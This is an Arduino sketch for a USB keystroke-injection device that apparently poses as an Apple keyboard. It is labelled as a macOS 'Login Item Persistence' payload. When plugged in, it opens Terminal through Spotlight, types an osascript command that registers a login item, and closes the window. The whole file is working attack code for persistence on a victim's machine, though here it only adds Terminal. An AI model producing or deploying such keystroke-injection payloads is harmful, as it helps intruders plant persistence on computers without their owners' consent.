#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // Add application to login items
  // Author: Generated
  // Title: Login Item Persistence
  // Target: macOS
  // Version: 1.0
  // Category: Persistence
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("osascript -e 'tell application \"System Events\" to make login item at end with properties {path:\"/Applications/Utilities/Terminal.app\", hidden:false}'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'Login item added'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}